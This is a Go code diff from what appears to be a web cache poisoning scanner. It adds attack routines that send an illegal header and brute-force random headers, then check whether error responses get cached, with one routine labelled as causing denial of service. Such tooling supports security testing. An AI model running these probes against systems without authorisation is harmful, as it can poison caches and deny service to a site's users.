@@ -7,7 +7,7 @@ import (
 	"github.com/valyala/fasthttp"
 )
 
-func RunSpecificAttacks(target *AttackTarget, timeout time.Duration, backoff time.Duration) SpecificAttackResult {
+func RunAttacks(target *AttackTarget, timeout time.Duration, backoff time.Duration) AttackResult {
 	//Setup HTTP context
 	net_ctx := HttpContext{}
 
@@ -24,7 +24,7 @@ func RunSpecificAttacks(target *AttackTarget, timeout time.Duration, backoff tim
 	defer fasthttp.ReleaseResponse(net_ctx.Response)
 
 	//Setting Up the result object
-	result := SpecificAttackResult{
+	result := AttackResult{
 		Target:      target,
 		VulnList:    make([]Vuln, 0, 10),
 		TimeStarted: time.Now(),
@@ -624,6 +624,130 @@ func RunPortDos(target *AttackTarget, net_ctx *HttpContext, backoff time.Duratio
 		ChunkSize:             40,
 		Backoff:               backoff,
 		DecisionFunc:          portDosDecisionFunc,
+	}
+
+	//Run Binary search on Headers
+	bin_search_result := HeaderBinarySearch(&args)
+
+	if len(bin_search_result) == 0 {
+		return false, nil
+	}
+
+	//See if any results are cached
+	args.HeaderValuePairs = bin_search_result
+	cache_test_result := IsHeaderEffectCached(&args)
+
+	result := make([]string, 0, len(bin_search_result))
+
+	for i, v := range cache_test_result {
+		if v {
+			result = append(result, bin_search_result[i][0])
+		}
+	}
+
+	if len(result) == 0 {
+		return false, nil
+	} else {
+		return true, result
+	}
+}
+
+// Attempt to cause a 400 through illegal header
+// Main Impact: DoS
+func RunIllegalHeader(target *AttackTarget, net_ctx *HttpContext, backoff time.Duration) (bool, []string) {
+	//necessary boilerplate
+	target.AcquireTarget(backoff)
+	defer target.ReleaseTarget()
+	defer target.MarkRequested()
+	//clear the request and response objects, they will be reused by the next function
+	defer net_ctx.Request.Reset()
+	defer net_ctx.Response.Reset()
+
+	//If not 200 there's nothing to do
+	if target.InitialResponse.StatusCode() != 200 {
+		return false, nil
+	}
+
+	//Prepare headers & header bin search args
+	header_value_pairs := [][]string{{"]", "illegal-header-value"}}
+
+	args := HeaderBinarySearchArgs{
+		Target:                target,
+		NetCtx:                net_ctx,
+		DisableNormalization:  true,
+		DisableSpecialHeaders: false,
+		UsePersistentHeaders:  true,
+		UseCookies:            false,
+		HeaderValuePairs:      header_value_pairs,
+		ChunkSize:             1,
+		Backoff:               backoff,
+		DecisionFunc:          pathOverrideDecisionFunc,
+	}
+
+	//Run Binary search on Headers
+	bin_search_result := HeaderBinarySearch(&args)
+
+	if len(bin_search_result) == 0 {
+		return false, nil
+	}
+
+	//See if any results are cached
+	args.HeaderValuePairs = bin_search_result
+	cache_test_result := IsHeaderEffectCached(&args)
+
+	result := make([]string, 0, len(bin_search_result))
+
+	for i, v := range cache_test_result {
+		if v {
+			result = append(result, bin_search_result[i][0])
+		}
+	}
+
+	if len(result) == 0 {
+		return false, nil
+	} else {
+		return true, result
+	}
+}
+
+// header bruteforce associated decision function
+func bruteforceDecisionFunc(_ [][]string, target *AttackTarget, response *fasthttp.Response) bool {
+	return response.StatusCode() != target.InitialResponse.StatusCode()
+}
+
+// Try many different headers
+// Main Impact: Header dependant
+func RunBruteforce(target *AttackTarget, net_ctx *HttpContext, backoff time.Duration) (bool, []string) {
+	//necessary boilerplate
+	target.AcquireTarget(backoff)
+	defer target.ReleaseTarget()
+	defer target.MarkRequested()
+	//clear the request and response objects, they will be reused by the next function
+	defer net_ctx.Request.Reset()
+	defer net_ctx.Response.Reset()
+
+	//If not 200 there's nothing to do
+	if target.InitialResponse.StatusCode() != 200 {
+		return false, nil
+	}
+
+	//Prepare headers & header bin search args
+	header_value_pairs := make([][]string, len(AllHeaders))
+	for i := range header_value_pairs {
+		header_value_pairs[i] = []string{AllHeaders[i], GenRandString(16)}
+	}
+
+	args := HeaderBinarySearchArgs{
+		Target:                target,
+		NetCtx:                net_ctx,
+		DisableNormalization:  false,
+		DisableSpecialHeaders: false,
+		UsePersistentHeaders:  true,
+		UseCookies:            false,
+		HeaderValuePairs:      header_value_pairs,
+		ChunkSize:             40,
+		Backoff:               backoff,
+		DecisionFunc:          bruteforceDecisionFunc,
 	}
 
 	//Run Binary search on Headers
